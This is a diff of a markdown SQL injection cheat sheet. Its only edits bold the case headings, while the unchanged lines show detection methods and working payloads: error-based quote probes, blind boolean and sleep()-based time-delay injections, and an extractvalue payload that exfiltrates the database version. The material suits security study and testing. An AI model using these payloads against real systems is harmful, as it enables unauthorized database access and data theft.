@@ -66,7 +66,7 @@ Ex 1: SELECT sleep(10)  /* Sleep for 10 sec */ <br>
 Ex 2: SELECT IF(CONDITION-HERE,sleep(10),'a'  /* Sleep for 10 sec if codition is True*/ <br>
 
 # Detecting SQL Injection <br>
-Case 1: When source code is available. <br>
+**Case 1: When source code is available.** <br>
 
 Try to find out dynamic query where user inputs are concatenating to SQL query without/partial sanitizing user's input. Some time developer does mistake to concatenate user input into query while using parameterize SQL query. <br>
 Ex 1: No parameterized query<br>
@@ -87,18 +87,18 @@ $stmt->bindParam(':lastname', $lastname); <br>
 $stmt->bindParam(':email', $email); <br>
 <br>
 
-Case 2: Black box Error based SQL Injection <br>
+**Case 2: Black box Error based SQL Injection <br>**
 1. single quote('), double quote("), and(&), semicolon(;), double dash(--) any character that break the SQL syntax. SQL server return Syntex error to end user. <br>
 Ex : $sql="SELECT * FROM users WHERE username = ''' AND password = '$password'";  /* gives syntax error */ <br>
   
-Case 3. Blind SQL Injection (Conditional) <br>
+**Case 3. Blind SQL Injection (Conditional)** <br>
 1. App return data based on True/False condition <br>
 Ex 1: "SELECT * FROM books WHERE bookid = -2 or 2>1# <br>
 
 Ex 2: "SELECT * FROM books WHERE bookid = -2 or 2>1 LIMIT 1# /*Return 1st result only*/ <br>
 <br>
 
-Case 4: Blind SQL Injection (Time delay) <br>
+**Case 4: Blind SQL Injection (Time delay)** <br>
 1. App return data after delaying certain time <br>
 Ex 1: "SELECT * FROM books WHERE bookid = -2 or sleep(10)#; <br>
 
@@ -117,7 +117,7 @@ Ex 2. SELECT IF(1=1,sleep(10),'a'); <br>
 9. ' & 2=2 # <br>
 
 # Data Exfiltration
-Case 1: Error based (Error based SQL Injection is used when UNION based SQL Injection is not possible) <br>
+**Case 1: Error based (Error based SQL Injection is used when UNION based SQL Injection is not possible) <br>**
 Ex 1: Extract DB version <br>
 test' AND extractvalue(rand(),concat(0x3a,(SELECT @@version))) #<br>
 
